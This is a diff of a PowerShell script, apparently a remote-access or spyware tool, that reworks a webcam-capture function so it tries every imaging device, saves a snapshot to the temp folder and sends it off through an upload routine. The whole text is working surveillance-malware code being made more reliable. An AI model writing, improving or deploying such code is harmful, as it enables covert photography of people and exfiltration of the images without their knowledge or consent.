@@ -34,14 +34,23 @@ function Connect-ZiPo {
 
     function Capture-Webcam {
         try {
-            $dev = (New-Object -ComObject WIA.DeviceManager).DeviceInfos.Item(1).Connect()
-            $img = $dev.Items.Item(1).Transfer()
-            $file = "$env:TEMP\webcam.jpg"
-            $img.SaveFile($file)
-            return Upload-File $file
+            $manager = New-Object -ComObject WIA.DeviceManager
+            foreach ($deviceInfo in $manager.DeviceInfos) {
+                try {
+                    $dev = $deviceInfo.Connect()
+                    $img = $dev.Items.Item(1).Transfer()
+                    $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
+                    $img.SaveFile($file)
+                    return Upload-File $file
+                }
+                catch {
+                    continue
+                }
+            }
+            return "[ERROR] No usable webcam device found"
         }
         catch {
-            return "[ERROR] Webcam not available"
+            return "[ERROR] Failed to enumerate webcam devices"
         }
     }
 
